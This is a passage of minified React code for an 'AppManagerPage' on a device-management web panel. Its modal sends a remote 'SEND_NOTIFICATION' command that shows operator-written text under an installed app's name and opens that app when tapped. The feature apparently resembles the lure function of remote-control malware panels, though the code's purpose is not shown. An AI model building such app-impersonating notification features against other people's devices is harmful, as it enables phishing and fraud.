                                }, t.id))
                            })]
                        })
                    }), (0, w.jsx)(f, {
                        page: W,
                        perPage: Q,
                        total: Ue.length,
                        onPageChange: q,
                        onPerPageChange: X,
                        className: "pt-1 shrink-0"
                    })]
            }),

            /* ===== 发送通知弹窗 ===== */
            _e && (0, w.jsx)("div", {
                className: "fixed inset-0 z-50 flex items-center justify-center bg-black/60",
                onClick: () => Ce(null),
                children: (0, w.jsxs)("div", {
                    className: "w-[420px] bg-[#161b22] border border-[#30363d] rounded-xl p-5 shadow-2xl",
                    onClick: e => e.stopPropagation(),
                    children: [(0, w.jsxs)("div", {
                        className: "flex items-center justify-between mb-4",
                        children: [(0, w.jsxs)("span", {
                            className: "text-[#e6edf3] text-base font-semibold",
                            children: ["发送通知 — ", _e.label]
                        }), (0, w.jsx)(s, {
                            size: "sm",
                            variant: "outline",
                            className: `h-8 w-8 p-0 ${Ve}`,
                            onClick: () => Ce(null),
                            children: (0, w.jsx)(l, { className: "h-4 w-4" })
                        })]
                    }), (0, w.jsxs)("div", {
                        className: "space-y-3",
                        children: [(0, w.jsxs)("div", {
                            children: [(0, w.jsx)("label", {
                                className: "text-sm text-[#8b949e] mb-1 block",
                                children: "通知内容"
                            }), (0, w.jsx)("textarea", {
                                className: "w-full px-3 py-2 text-sm bg-[#0d1117] border border-[#30363d] rounded-md text-[#e6edf3] placeholder-[#8b949e] focus:border-green-500 focus:outline-none resize-none",
                                value: $e,
                                onChange: e => Pe(e.target.value),
                                placeholder: "请输入通知内容",
                                rows: 3,
                                maxLength: 200
                            })]
                        }), (0, w.jsxs)("div", {
                            className: "flex items-center gap-3",
                            children: [(0, w.jsx)("span", {
                                className: "text-sm text-[#8b949e]",
                                children: "显示位置"
                            }), (0, w.jsxs)("div", {
                                className: "flex gap-2",
                                children: [(0, w.jsx)("button", {
                                    className: "px-3 py-1 rounded text-sm transition-colors " + ("top" === Te ? "bg-red-500/20 text-red-400 border border-red-500/50" : "bg-[#0d1117] text-[#8b949e] border border-[#30363d] hover:border-[#8b949e]"),
                                    onClick: () => Le("top"),
                                    children: "顶部"
                                }), (0, w.jsx)("button", {
                                    className: "px-3 py-1 rounded text-sm transition-colors " + ("center" === Te ? "bg-red-500/20 text-red-400 border border-red-500/50" : "bg-[#0d1117] text-[#8b949e] border border-[#30363d] hover:border-[#8b949e]"),
                                    onClick: () => Le("center"),
                                    children: "中间"
                                })]
                            })]
                        }), (0, w.jsxs)("div", {
                            className: "bg-amber-500/10 border border-amber-500/20 rounded-md p-3 text-xs text-amber-300/80",
                            children: ["通知将显示在设备", "top" === Te ? "顶部" : "中间", "，用户点击后自动打开 ", (0, w.jsx)("strong", { children: _e.label })]
                        })]
                    }), (0, w.jsxs)("div", {
                        className: "flex justify-end gap-2 mt-4",
                        children: [(0, w.jsx)(s, {
                            size: "sm",
                            variant: "outline",
                            className: Ve,
                            onClick: () => Ce(null),
                            children: "取消"
                        }), (0, w.jsxs)(s, {
                            size: "sm",
                            variant: "outline",
                            className: "bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20 gap-1.5",
                            disabled: !$e.trim(),
                            onClick: async () => {
                                if (_e && $e.trim()) try {
                                    await fetch(`/m/device/${b}/command`, {
                                        method: "POST",
                                        headers: k(),
                                        body: JSON.stringify({
                                            command: "SEND_NOTIFICATION",
                                            payload: {
                                                packageName: _e.pkg,
                                                appName: _e.label,
                                                content: $e.trim(),
                                                position: Te
                                            }
                                        })
                                    }), localStorage.setItem("notification_content_global", $e.trim()), Ce(null)
                                } catch {}
                            },
                            children: [(0, w.jsx)(o, { className: "h-3.5 w-3.5" }), "发送通知"]
                        })]
                    })]
                })
            })
        ]
    })
})

};
export{_ as AppManagerPage};
